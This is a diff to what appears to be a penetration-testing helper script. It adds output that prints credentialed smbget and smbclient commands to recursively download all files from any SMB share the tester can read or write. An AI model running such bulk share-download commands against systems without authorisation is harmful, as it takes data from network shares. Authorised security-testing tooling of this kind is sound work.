@@ -630,6 +630,23 @@ check_and_suggest() {
                     fi
                 done
                 
+                # Add recursive download suggestions
+                echo -e "\n\033[92m[+] Download all files from shares:\033[0m"
+                echo "$shares_output" | while read -r line; do
+                    clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
+                    if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
+                        share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i=="READ" || $i=="WRITE") print $(i-1)}')
+                        share=${share#\\}
+                        if [ ! -z "$share" ]; then
+                            echo "# Download $share recursively:"
+                            echo "smbget -R smb://$IP/$share -U '$SMBCLIENT_AUTH'"
+                            echo "# Or with smbclient (interactive):"
+                            echo "smbclient $SMBCLIENT_AUTH //$IP/$share -c 'prompt OFF;recurse ON;mget *'"
+                            echo ""
+                        fi
+                    fi
+                done
+                
                 # Add remote execution tool suggestions
                 echo -e "\n\033[92m[+] Remote execution tools:\033[0m"
                 if echo "$output" | grep -q "Pwn3d!"; then
